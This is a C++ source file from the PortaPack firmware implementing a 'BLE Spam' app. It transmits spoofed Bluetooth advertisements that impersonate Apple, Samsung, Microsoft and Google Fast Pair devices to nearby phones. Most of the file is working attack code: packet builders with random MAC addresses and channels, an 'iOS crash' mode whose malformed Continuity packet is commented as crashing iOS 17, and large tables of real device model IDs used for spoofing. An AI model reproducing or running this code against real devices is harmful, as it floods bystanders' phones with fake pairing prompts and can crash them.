/*
 * Copyright (C) 2014 Jared Boone, ShareBrained Technology, Inc.
 * Copyright (C) 2017 Furrtek
 *
 * This file is part of PortaPack.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; see the file COPYING.  If not, write to
 * the Free Software Foundation, Inc., 51 Franklin Street,
 * Boston, MA 02110-1301, USA.
 */

// Code from https://github.com/Flipper-XFW/Xtreme-Apps/tree/04c3a60093e2c2378e79498b4505aa8072980a42/ble_spam/protocols
// Thanks for the work of the original creators!

#include "ui_blespam.hpp"
#include "ui_modemsetup.hpp"

#include "modems.hpp"
#include "audio.hpp"
#include "rtc_time.hpp"
#include "baseband_api.hpp"
#include "string_format.hpp"
#include "portapack_persistent_memory.hpp"

using namespace portapack;
using namespace modems;
using namespace ui;

#ifndef COUNT_OF
#define COUNT_OF(x) (sizeof(x) / sizeof(x[0]))
#endif

namespace ui::external_app::blespam {

void BLESpamView::focus() {
    button_startstop.focus();
}

uint64_t BLESpamView::get_freq_by_channel_number(uint8_t channel_number) {
    uint64_t freq_hz;

    switch (channel_number) {
        case 37:
            freq_hz = 2'402'000'000ull;
            break;
        case 38:
            freq_hz = 2'426'000'000ull;
            break;
        case 39:
            freq_hz = 2'480'000'000ull;
            break;
        case 0 ... 10:
            freq_hz = 2'404'000'000ull + channel_number * 2'000'000ull;
            break;
        case 11 ... 36:
            freq_hz = 2'428'000'000ull + (channel_number - 11) * 2'000'000ull;
            break;
        default:
            freq_hz = UINT64_MAX;
    }

    return freq_hz;
}
BLESpamView::BLESpamView(NavigationView& nav)
    : nav_{nav} {
    add_children({&button_startstop,
                  &field_frequency,
                  &tx_view,
                  &chk_randdev,
                  &options_atkmode,
                  &console});

    button_startstop.on_select = [this](Button&) {
        if (is_running) {
            is_running = false;
            stop();
            button_startstop.set_text(LanguageHelper::currentMessages[LANG_START]);
        } else {
            is_running = true;
            start();
            button_startstop.set_text(LanguageHelper::currentMessages[LANG_STOP]);
        }
    };
    chk_randdev.set_value(true);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
    chk_randdev.on_select = [this](Checkbox&, bool v) {
        randomDev = v;
    };
    options_atkmode.on_change = [this](size_t, int32_t i) {
        attackType = (ATK_TYPE)i;
        changePacket(true);
    };
    console.writeln("Based on work of:");
    console.writeln("@Willy-JL, @ECTO-1A,");
    console.writeln("@Spooks4576, @iNetro");
    console.writeln("");
    changePacket(true);  // init
}

void BLESpamView::stop() {
    transmitter_model.disable();
    baseband::shutdown();
}

void BLESpamView::start() {
    baseband::run_image(portapack::spi_flash::image_tag_btle_tx);
    transmitter_model.enable();

    baseband::set_btletx(channel_number, mac, advertisementData, pduType);
}
void BLESpamView::reset() {
    stop();
    start();
}

void BLESpamView::randomChn() {
    channel_number = 37 + std::rand() % (39 - 37 + 1);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
}

void BLESpamView::randomizeMac() {
    if (!randomMac) return;
    const char hexDigits[] = "0123456789ABCDEF";
    // Generate 12 random hexadecimal characters
    for (int i = 0; i < 12; ++i) {
        int randomIndex = rand() % 16;
        mac[i] = hexDigits[randomIndex];
    }
    mac[12] = '\0';  // Null-terminate the string
}

void BLESpamView::on_tx_progress(const bool done) {
    if (done) {
        if (is_running) {
            changePacket(false);
            baseband::set_btletx(channel_number, mac, advertisementData, pduType);
        }
    }
}

void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
    for (uint32_t i = 0; i < len; i += 4) {
        const uint32_t random_val = rand();
        uint8_t len_cur = ((i + 4) < len) ? (4) : (len - i);
        memcpy(&buf[i], &random_val, len_cur);
    }
}

void BLESpamView::createSamsungPacket() {
    uint8_t packet_SamsungSizes[] = {0, 31, 15};
    EasysetupType type;
    const EasysetupType types[] = {
        EasysetupTypeBuds,
        EasysetupTypeWatch,
    };
    type = types[rand() % COUNT_OF(types)];

    uint8_t size = packet_SamsungSizes[type];
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    switch (type) {
        case EasysetupTypeBuds: {
            uint32_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = buds_models[rand() % buds_models_count].value;
                    break;
                    /*case PayloadModeValue:
                        model = cfg->data.buds.model;
                        break;*/
            }

            packet[i++] = 27;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x42;
            packet[i++] = 0x09;
            packet[i++] = 0x81;
            packet[i++] = 0x02;
            packet[i++] = 0x14;
            packet[i++] = 0x15;
            packet[i++] = 0x03;
            packet[i++] = 0x21;
            packet[i++] = 0x01;
            packet[i++] = 0x09;
            packet[i++] = (model >> 0x10) & 0xFF;  // Buds Model / Color (?)
            packet[i++] = (model >> 0x08) & 0xFF;  // ...
            packet[i++] = 0x01;                    // ... (Always static?)
            packet[i++] = (model >> 0x00) & 0xFF;  // ...
            packet[i++] = 0x06;
            packet[i++] = 0x3C;
            packet[i++] = 0x94;
            packet[i++] = 0x8E;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0xC7;
            packet[i++] = 0x00;

            packet[i++] = 16;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            // Truncated AD segment, Android seems to fill in the rest with zeros
            break;
        }
        case EasysetupTypeWatch: {
            uint8_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = watch_models[rand() % watch_models_count].value;
                    break;
                    /*case PayloadModeValue:
                        model = cfg->data.watch.model;
                        break;*/
            }

            packet[i++] = 14;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x01;
            packet[i++] = 0x00;
            packet[i++] = 0x02;
            packet[i++] = 0x00;
            packet[i++] = 0x01;
            packet[i++] = 0x01;
            packet[i++] = 0xFF;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x43;
            packet[i++] = (model >> 0x00) & 0xFF;  // Watch Model / Color (?)
            break;
        }
        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createWindowsPacket() {
    /*  const char* names[] = {
          "PortaPack",
          "HackRf",
          "iOS 21 🍎",
          "WorkMate",
          "👉👌",
          "🔵🦷",
      }; //not worky using fix, for testing.
      */
    const char* name = "Hi :)";
    // name = names[rand() % 6];
    uint8_t name_len = strlen(name);

    uint8_t size = 7 + name_len;
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1;              // Size
    packet[i++] = 0xFF;                  // AD Type (Manufacturer Specific)
    packet[i++] = 0x06;                  // Company ID (Microsoft)
    packet[i++] = 0x00;                  // ...
    packet[i++] = 0x03;                  // Microsoft Beacon ID
    packet[i++] = 0x00;                  // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80;                  // Reserved RSSI Byte
    memcpy(&packet[i], name, name_len);  // Device Name
    i += name_len;
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createIosPacket(bool crash = false) {
    uint8_t ios_packet_sizes[18] = {0, 0, 0, 0, 0, 24, 0, 31, 0, 12, 0, 0, 20, 0, 12, 11, 11, 17};
    ContinuityType type;
    const ContinuityType types[] = {
        ContinuityTypeProximityPair,
        ContinuityTypeNearbyAction,
    };
    type = types[rand() % 2];
    if (crash) type = ContinuityTypeCustomCrash;

    uint8_t size = ios_packet_sizes[type];
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1;    // Size
    packet[i++] = 0xFF;        // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C;        // Company ID (Apple, Inc.)
    packet[i++] = 0x00;        // ...
    packet[i++] = type;        // Continuity Type
    packet[i] = size - i - 1;  // Continuity Size
    i++;

    switch (type) {
        case ContinuityTypeAirDrop: {
            packet[i++] = 0x00;            // Zeros
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // AppleID
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Phone Number
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email2
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = 0x00;            // Zero
            break;
        }

        case ContinuityTypeProximityPair: {
            uint16_t model;
            uint8_t color;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default: {
                    uint8_t model_index = rand() % pp_models_count;
                    uint8_t color_index = rand() % pp_models[model_index].colors_count;
                    model = pp_models[model_index].value;
                    color = pp_models[model_index].colors[color_index].value;
                    break;
                }
                    /* case PayloadModeValue:
                         model = cfg->data.proximity_pair.model;
                         color = cfg->data.proximity_pair.color;
                         break;*/
            }

            uint8_t prefix;
            if (model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;

            packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
            packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
            packet[i++] = (model >> 0x00) & 0xFF;                // ...
            packet[i++] = 0x55;                                  // Status
            packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
            packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
            packet[i++] = (rand() % 256);                        // Lid Open Counter
            packet[i++] = color;                                 // Device Color
            packet[i++] = 0x00;
            furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
            i += 16;
            break;
        }

        case ContinuityTypeAirplayTarget: {
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 256);  // Configuration Seed
            packet[i++] = (rand() % 256);  // IPv4 Address
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeHandoff: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Initialization Vector
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // AES-GCM Auth Tag
            packet[i++] = (rand() % 256);  // Encrypted Payload
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeTetheringSource: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 101);  // Battery Life
            packet[i++] = 0x00;            // Cell Service Type
            packet[i++] = (rand() % 8);    // ...
            packet[i++] = (rand() % 5);    // Cell Service Strength
            break;
        }

        case ContinuityTypeNearbyAction: {
            uint8_t action;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    action = na_actions[rand() % na_actions_count].value;
                    break;
                    /* case PayloadModeValue:
                         action = cfg->data.nearby_action.action;
                         break;*/
            }

            uint8_t flags;

            flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            packet[i++] = flags;                      // Action Flags
            packet[i++] = action;                     // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);  // Authentication Tag
            i += 3;
            break;
        }

        case ContinuityTypeNearbyInfo: {
            packet[i++] = ((rand() % 16) << 4) + (rand() % 16);  // Status Flags and Action Code
            packet[i++] = (rand() % 256);                        // Status Flags
            packet[i++] = (rand() % 256);                        // Authentication Tag
            packet[i++] = (rand() % 256);                        // ...
            packet[i++] = (rand() % 256);                        // ...
            break;
        }

        case ContinuityTypeCustomCrash: {
            // Found by @ECTO-1A

            uint8_t action = na_actions[rand() % na_actions_count].value;
            uint8_t flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            i -= 2;                                    // Override segment header
            packet[i++] = ContinuityTypeNearbyAction;  // Continuity Type
            packet[i++] = 5;                           // Continuity Size
            packet[i++] = flags;                       // Action Flags
            packet[i++] = action;                      // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);   // Authentication Tag
            i += 3;

            packet[i++] = 0x00;  // Additional Action Data Terminator (?)
            packet[i++] = 0x00;  // ...

            packet[i++] = ContinuityTypeNearbyInfo;   // Continuity Type (?)
            furi_hal_random_fill_buf(&packet[i], 3);  // Continuity Size (?) + 3 random bytes to crash IOS17 (?)
            i += 3;
            break;
        }

        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createFastPairPacket() {
    uint32_t model = fastpairModels[rand() % fastpairModels_count].value;
    uint8_t size = 14;
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = 3;     // Size
    packet[i++] = 0x03;  // AD Type (Service UUID List)
    packet[i++] = 0x2C;  // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE;  // ...

    packet[i++] = 6;                       // Size
    packet[i++] = 0x16;                    // AD Type (Service Data)
    packet[i++] = 0x2C;                    // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE;                    // ...
    packet[i++] = (model >> 0x10) & 0xFF;  // Device Model
    packet[i++] = (model >> 0x08) & 0xFF;  // ...
    packet[i++] = (model >> 0x00) & 0xFF;  // ...

    packet[i++] = 2;                     // Size
    packet[i++] = 0x0A;                  // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100;  // -100 to +20 dBm

    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::changePacket(bool forced = false) {
    counter++;  // need to send it multiple times to be accepted
    if (counter >= 4 || forced) {
        // really change packet and mac.
        counter = 0;
        randomizeMac();
        randomChn();
        if (randomDev || forced) {
            switch (attackType) {
                case ATK_IOS_CRASH:
                    createIosPacket(true);
                    break;
                case ATK_IOS:
                    createIosPacket(false);
                    break;
                case ATK_SAMSUNG:
                    createSamsungPacket();
                    break;
                case ATK_WINDOWS:
                    createWindowsPacket();
                    break;
                default:
                case ATK_ANDROID:
                    createFastPairPacket();
                    break;
            }
        }
        // rate limit console display
        displayCounter++;
        if (displayCounter > 25) {
            displayCounter = 0;
            console.writeln(advertisementData);
        }
    }
}

BLESpamView::~BLESpamView() {
    is_running = false;
    stop();
}

const BLESpamView::ContinuityColor BLESpamView::colors_white[] = {
    {0x00},  //, "White"
};
const BLESpamView::ContinuityColor BLESpamView::colors_airpods_max[] = {
    {0x00},  //, "White"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x0F},  //, "Black"
    {0x11},  //, "Light Green"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_flex[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x6},   //, "Gray"
    {0x7},   //, "Gold/White"
    {0x8},   //, "Rose Gold"
    {0x09},  //, "Black"
    {0xE},   //, "Violet/White"
    {0xF},   //, "Bright Red"
    {0x12},  //, "Dark Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Dark Gray"
    {0x15},  //, "Dark Blue"
    {0x1D},  //, "Rose Gold 2"
    {0x20},  //, "Blue/Green"
    {0x21},  //, "Purple/Orange"
    {0x22},  //, "Deep Blue/ Light blue"
    {0x23},  //, "Magenta/Light Fuchsia"
    {0x25},  //, "Black/Red"
    {0x2A},  //, "Gray / Disney LTD"
    {0x2E},  //, "Pinkish white"
    {0x3D},  //, "Red/Blue"
    {0x3E},  //, "Yellow/Blue"
    {0x3F},  //, "White/Red"
    {0x40},  //, "Purple/White"
    {0x5B},  //, "Gold"
    {0x5C},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x0B},  //, "Gray/Blue"
    {0x0C},  //, "Gray/Red"
    {0x0D},  //, "Gray/Green"
    {0x12},  //, "Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Gray"
    {0x15},  //, "Deep Blue"
    {0x17},  //, "Dark with Gold Logo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_pro[] = {
    {0x00},  //, "White"
    {0x02},  //, "Yellowish Green"
    {0x03},  //, "Blue"
    {0x04},  //, "Black"
    {0x05},  //, "Pink"
    {0x06},  //, "Red"
    {0x0B},  //, "Gray ?"
    {0x0D},  //, " Sky Blue
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds[] = {
    {0x00},  //, "White"
    {0x0},   // 1, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x04},  //, "Pink"
    {0x06},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_x[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Blue"
    {0x05},  //, "Gray"
    {0x1D},  //, "Pink"
    {0x25},  //, "Dark/Red"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x18},  //, "Shadow Gray"
    {0x19},  //, "Desert Sand"
    {0x25},  //, "Black / Red"
    {0x26},  //, "Midnight Black"
    {0x27},  //, "Desert Sand 2"
    {0x28},  //, "Gray"
    {0x29},  //, "Clear blue/ gold"
    {0x42},  //, "Green Forest camo"
    {0x43},  //, "White Camo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_fit_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Pink"
    {0x03},  //, "Grey/White"
    {0x04},  //, "Full Pink"
    {0x05},  //, "Neon Green"
    {0x06},  //, "Night Blue"
    {0x07},  //, "Light Pink"
    {0x08},  //, "Brown"
    {0x09},  //, "Dark Brown"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds_[] = {
    {0x00},  //, "Black"
    {0x01},  //, "White"
    {0x02},  //, "Transparent"
    {0x03},  //, "Silver"
    {0x04},  //, "Pink"
};

const BLESpamView::contiModels BLESpamView::pp_models[] = {
    {0x0E20, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro",
    {0x0A20, colors_airpods_max, COUNT_OF(colors_airpods_max)},                //"AirPods Max",
    {0x0055, colors_white, COUNT_OF(colors_white)},                            //"Airtag",
    {0x0030, colors_white, COUNT_OF(colors_white)},                            //"Hermes Airtag",
    {0x0220, colors_white, COUNT_OF(colors_white)},                            //"AirPods",
    {0x0F20, colors_white, COUNT_OF(colors_white)},                            //"AirPods 2nd Gen",
    {0x1320, colors_white, COUNT_OF(colors_white)},                            //"AirPods 3rd Gen",
    {0x1420, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro 2nd Gen",
    {0x1020, colors_beats_flex, COUNT_OF(colors_beats_flex)},                  // "Beats Flex",
    {0x0620, colors_beats_solo_3, COUNT_OF(colors_beats_solo_3)},              // "Beats Solo 3",
    {0x0320, colors_powerbeats_3, COUNT_OF(colors_powerbeats_3)},              //"Powerbeats 3",
    {0x0B20, colors_powerbeats_pro, COUNT_OF(colors_powerbeats_pro)},          //"Powerbeats Pro",
    {0x0C20, colors_beats_solo_pro, COUNT_OF(colors_beats_solo_pro)},          //"Beats Solo Pro",
    {0x1120, colors_beats_studio_buds, COUNT_OF(colors_beats_studio_buds)},    //"Beats Studio Buds",
    {0x0520, colors_beats_x, COUNT_OF(colors_beats_x)},                        //"Beats X",
    {0x0920, colors_beats_studio_3, COUNT_OF(colors_beats_studio_3)},          //"Beats Studio 3",
    {0x1720, colors_beats_studio_pro, COUNT_OF(colors_beats_studio_pro)},      //"Beats Studio Pro",
    {0x1220, colors_beats_fit_pro, COUNT_OF(colors_beats_fit_pro)},            //"Beats Fit Pro",
    {0x1620, colors_beats_studio_buds_, COUNT_OF(colors_beats_studio_buds_)},  //"Beats Studio Buds+",
};
const uint8_t BLESpamView::pp_models_count = COUNT_OF(pp_models);

const BLESpamView::contiU8 BLESpamView::pp_prefixes[] = {
    {0x07},  //, "New Device"
    {0x01},  //, "Not Your Device"
    {0x05},  //, "New Airtag"
};

const uint8_t BLESpamView::pp_prefixes_count = COUNT_OF(pp_prefixes);

const BLESpamView::contiU8 BLESpamView::na_actions[] = {
    {0x13},  //, "AppleTV AutoFill"
    {0x27},  //, "AppleTV Connecting..."
    {0x20},  //, "Join This AppleTV?"
    {0x19},  //, "AppleTV Audio Sync"
    {0x1E},  //, "AppleTV Color Balance"
    {0x09},  //, "Setup New iPhone"
    {0x02},  //, "Transfer Phone Number"
    {0x0B},  //, "HomePod Setup"
    {0x01},  //, "Setup New AppleTV"
    {0x06},  //, "Pair AppleTV"
    {0x0D},  //, "HomeKit AppleTV Setup"
    {0x2B},  //, "AppleID for AppleTV?"
};

const uint8_t BLESpamView::na_actions_count = COUNT_OF(na_actions);

// fastpair

const BLESpamView::fpUi32 BLESpamView::fastpairModels[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0x470000, "Arduino 101 2"},
    {0x00000A, "Anti-Spoof Test"},
    {0x0A0000, "Anti-Spoof Test 2"},
    {0x00000B, "Google Gphones"},
    {0x0B0000, "Google Gphones 2"},
    {0x0C0000, "Google Gphones 3"},
    {0x00000D, "Test 00000D"},
    {0x000007, "Android Auto"},
    {0x070000, "Android Auto 2"},
    {0x000008, "Foocorp Foophones"},
    {0x080000, "Foocorp Foophones 2"},
    {0x000009, "Test Android TV"},
    {0x090000, "Test Android TV 2"},
    {0x000035, "Test 000035"},
    {0x350000, "Test 000035 2"},
    {0x000048, "Fast Pair Headphones"},
    {0x480000, "Fast Pair Headphones 2"},
    {0x000049, "Fast Pair Headphones 3"},
    {0x490000, "Fast Pair Headphones 4"},
    {0x001000, "LG HBS1110"},
    {0x00B727, "Smart Controller 1"},
    {0x01E5CE, "BLE-Phone"},
    {0x0200F0, "Goodyear"},
    {0x00F7D4, "Smart Setup"},
    {0xF00002, "Goodyear"},
    {0xF00400, "T10"},
    {0x1E89A7, "ATS2833_EVB"},

    // Phone setup
    {0x00000C, "Google Gphones Transfer"},
    {0x0577B1, "Galaxy S23 Ultra"},
    {0x05A9BC, "Galaxy S20+"},

    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0x0000F0, "Bose QuietComfort 35 II"},
    {0xF00000, "Bose QuietComfort 35 II 2"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x0002F0, "JBL Everest 110GA"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0x060000, "Google Pixel buds 2"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},
    {0x0003F0, "LG HBS-835S"},
    {0x002000, "AIAIAI TMA-2 (H60)"},
    {0x003000, "Libratone Q Adapt On-Ear"},
    {0x003001, "Libratone Q Adapt On-Ear 2"},
    {0x00A168, "boAt  Airdopes 621"},
    {0x00AA48, "Jabra Elite 2"},
    {0x00AA91, "Beoplay E8 2.0"},
    {0x00C95C, "Sony WF-1000X"},
    {0x01EEB4, "WH-1000XM4"},
    {0x02AA91, "B&O Earset"},
    {0x01C95C, "Sony WF-1000X"},
    {0x02D815, "ATH-CK1TW"},
    {0x035764, "PLT V8200 Series"},
    {0x038CC7, "JBL TUNE760NC"},
    {0x02DD4F, "JBL TUNE770NC"},
    {0x02E2A9, "TCL MOVEAUDIO S200"},
    {0x035754, "Plantronics PLT_K2"},
    {0x02C95C, "Sony WH-1000XM2"},
    {0x038B91, "DENON AH-C830NCW"},
    {0x02F637, "JBL LIVE FLEX"},
    {0x02D886, "JBL REFLECT MINI NC"},
    {0xF00000, "Bose QuietComfort 35 II"},
    {0xF00001, "Bose QuietComfort 35 II"},
    {0xF00201, "JBL Everest 110GA"},
    {0xF00204, "JBL Everest 310GA"},
    {0xF00209, "JBL LIVE400BT"},
    {0xF00205, "JBL Everest 310GA"},
    {0xF00200, "JBL Everest 110GA"},
    {0xF00208, "JBL Everest 710GA"},
    {0xF00207, "JBL Everest 710GA"},
    {0xF00206, "JBL Everest 310GA"},
    {0xF0020A, "JBL LIVE400BT"},
    {0xF0020B, "JBL LIVE400BT"},
    {0xF0020C, "JBL LIVE400BT"},
    {0xF00203, "JBL Everest 310GA"},
    {0xF00202, "JBL Everest 110GA"},
    {0xF00213, "JBL LIVE650BTNC"},
    {0xF0020F, "JBL LIVE500BT"},
    {0xF0020E, "JBL LIVE500BT"},
    {0xF00214, "JBL LIVE650BTNC"},
    {0xF00212, "JBL LIVE500BT"},
    {0xF0020D, "JBL LIVE400BT"},
    {0xF00211, "JBL LIVE500BT"},
    {0xF00215, "JBL LIVE650BTNC"},
    {0xF00210, "JBL LIVE500BT"},
    {0xF00305, "LG HBS-1500"},
    {0xF00304, "LG HBS-1010"},
    {0xF00308, "LG HBS-1125"},
    {0xF00303, "LG HBS-930"},
    {0xF00306, "LG HBS-1700"},
    {0xF00300, "LG HBS-835S"},
    {0xF00309, "LG HBS-2000"},
    {0xF00302, "LG HBS-830"},
    {0xF00307, "LG HBS-1120"},
    {0xF00301, "LG HBS-835"},
    {0xF00E97, "JBL VIBE BEAM"},
    {0x04ACFC, "JBL WAVE BEAM"},
    {0x04AA91, "Beoplay H4"},
    {0x04AFB8, "JBL TUNE 720BT"},
    {0x05A963, "WONDERBOOM 3"},
    {0x05AA91, "B&O Beoplay E6"},
    {0x05C452, "JBL LIVE220BT"},
    {0x05C95C, "Sony WI-1000X"},
    {0x0602F0, "JBL Everest 310GA"},
    {0x0603F0, "LG HBS-1700"},
    {0x1E8B18, "SRS-XB43"},
    {0x1E955B, "WI-1000XM2"},
    {0x1EC95C, "Sony WF-SP700N"},
    {0x1ED9F9, "JBL WAVE FLEX"},
    {0x1EE890, "ATH-CKS30TW WH"},
    {0x1EEDF5, "Teufel REAL BLUE TWS 3"},
    {0x1F1101, "TAG Heuer Calibre E4 45mm"},
    {0x1F181A, "LinkBuds S"},
    {0x1F2E13, "Jabra Elite 2"},
    {0x1F4589, "Jabra Elite 2"},
    {0x1F4627, "SRS-XG300"},
    {0x1F5865, "boAt Airdopes 441"},
    {0x1FBB50, "WF-C700N"},
    {0x1FC95C, "Sony WF-SP700N"},
    {0x1FE765, "TONE-TF7Q"},
    {0x1FF8FA, "JBL REFLECT MINI NC"},
    {0x201C7C, "SUMMIT"},
    {0x202B3D, "Amazfit PowerBuds"},
    {0x20330C, "SRS-XB33"},
    {0x003B41, "M&D MW65"},
    {0x003D8A, "Cleer FLOW II"},
    {0x005BC3, "Panasonic RP-HD610N"},
    {0x008F7D, "soundcore Glow Mini"},
    {0x00FA72, "Pioneer SE-MS9BN"},
    {0x0100F0, "Bose QuietComfort 35 II"},
    {0x011242, "Nirvana Ion"},
    {0x013D8A, "Cleer EDGE Voice"},
    {0x01AA91, "Beoplay H9 3rd Generation"},
    {0x038F16, "Beats Studio Buds"},
    {0x039F8F, "Michael Kors Darci 5e"},
    {0x03AA91, "B&O Beoplay H8i"},
    {0x03B716, "YY2963"},
    {0x03C95C, "Sony WH-1000XM2"},
    {0x03C99C, "MOTO BUDS 135"},
    {0x03F5D4, "Writing Account Key"},
    {0x045754, "Plantronics PLT_K2"},
    {0x045764, "PLT V8200 Series"},
    {0x04C95C, "Sony WI-1000X"},
    {0x050F0C, "Major III Voice"},
    {0x052CC7, "MINOR III"},
    {0x057802, "TicWatch Pro 5"},
    {0x0582FD, "Pixel Buds"},
    {0x058D08, "WH-1000XM4"},
